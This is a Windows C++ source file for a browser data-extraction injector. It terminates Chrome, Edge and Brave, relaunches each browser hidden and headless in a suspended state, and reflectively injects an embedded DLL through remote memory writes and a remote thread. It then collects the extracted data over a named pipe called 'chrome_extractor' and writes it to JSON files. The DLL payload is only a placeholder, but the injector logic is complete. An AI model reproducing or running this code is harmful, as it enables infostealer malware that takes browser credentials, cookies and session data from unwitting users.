#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include "bootstrapper.h"

namespace fs = std::filesystem;

// Placeholder for the actual Base64 encoded DLL
const char* EMBEDDED_DLL_BASE64 = "BASE64_ENCODED_DLL";

struct BrowserConfig {
    std::string name;
    std::string exe_name;
    std::vector<std::string> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {"Chrome", "chrome.exe", {R"(C:\Program Files\Google\Chrome\Application\chrome.exe)", R"(C:\Program Files (x86)\Google\Chrome\Application\chrome.exe)"}},
    {"Edge", "msedge.exe", {R"(C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe)", R"(C:\Program Files\Microsoft\Edge\Application\msedge.exe)"}},
    {"Brave", "brave.exe", {R"(C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe)", R"(C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe)"}}
};

std::string find_browser_exe(const std::string& name) {
    for (const auto& b : BROWSERS) {
        if (b.name == name) {
            for (const auto& path : b.common_paths) {
                if (fs::exists(path)) return path;
            }
        }
    }
    return "";
}

void kill_processes_by_name(const std::string& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring current_exe_w(entry.szExeFile);
            std::string current_exe(current_exe_w.begin(), current_exe_w.end());
            // Case-insensitive check
            std::string lower_exe = current_exe;
            std::transform(lower_exe.begin(), lower_exe.end(), lower_exe.begin(), ::tolower);
            std::string lower_target = exe_name;
            std::transform(lower_target.begin(), lower_target.end(), lower_target.begin(), ::tolower);

            if (lower_exe == lower_target) {
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (h_process) {
                    TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    auto dos_header = (PIMAGE_DOS_HEADER)dll_bytes.data();
    auto nt_headers = (PIMAGE_NT_HEADERS64)((size_t)dll_bytes.data() + dos_header->e_lfanew);
    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;
    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remote_base) return;

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    auto section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (section_header[i].PointerToRawData && section_header[i].SizeOfRawData) {
            void* dest = (void*)((size_t)remote_base + section_header[i].VirtualAddress);
            void* src = (void*)((size_t)dll_bytes.data() + section_header[i].PointerToRawData);
            WriteProcessMemory(h_process, dest, src, section_header[i].SizeOfRawData, NULL);
        }
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo info = {
        remote_base,
        (pLoadLibraryA)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (pGetProcAddress)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0 || bootstrapper_size > 0x1000000) bootstrapper_size = 4096;

    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, remote_bootstrap, &info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_bootstrap + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_bootstrap, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& config) {
    std::cout << "\n--- Processing Browser: " << config.name << " ---" << std::endl;
    kill_processes_by_name(config.exe_name);

    std::wstring cmd = L"\"" + std::wstring(config.exe_name.begin(), config.exe_name.end()) + L"\" --headless --disable-gpu";

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::string path = find_browser_exe(config.name);
        if (!path.empty()) {
            std::wstring full_cmd = L"\"" + std::wstring(path.begin(), path.end()) + L"\" --headless --disable-gpu";
            if (!CreateProcessW(NULL, (LPWSTR)full_cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return;
        } else return;
    }

    inject_dll_reflective(pi.hProcess, dll_bytes);
    ResumeThread(pi.hThread);

    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
    if (h_pipe != INVALID_HANDLE_VALUE) {
        if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            std::vector<char> buffer;
            char temp[8192];
            DWORD bytes_read;
            while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
                buffer.insert(buffer.end(), temp, temp + bytes_read);
            }
            if (!buffer.empty()) {
                fs::create_directories(config.name);
                std::ofstream ofs(config.name + "/extracted_data.json");
                ofs.write(buffer.data(), buffer.size());
                std::cout << "[+] Data saved for " << config.name << std::endl;
            }
        }
        CloseHandle(h_pipe);
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

std::vector<unsigned char> decode_base64(const std::string& input) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> ret;
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];

    for (char c : input) {
        if (c == '=' || base64_chars.find(c) == std::string::npos) continue;
        char_array_4[i++] = c;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; j < i - 1; j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

int main(int argc, char* argv[]) {
    std::string target = (argc > 1) ? argv[1] : "all";
    std::vector<unsigned char> dll_bytes = decode_base64(EMBEDDED_DLL_BASE64);

    if (dll_bytes.empty()) {
        std::cerr << "[-] Failed to decode embedded DLL or DLL is empty." << std::endl;
    }

    if (target == "all") {
        for (const auto& b : BROWSERS) inject_and_collect(dll_bytes, b);
    } else {
        bool found = false;
        for (const auto& b : BROWSERS) {
            if (b.name == target) {
                inject_and_collect(dll_bytes, b);
                found = true;
                break;
            }
        }
        if (!found) std::cerr << "[-] Browser not found: " << target << std::endl;
    }
    return 0;
}
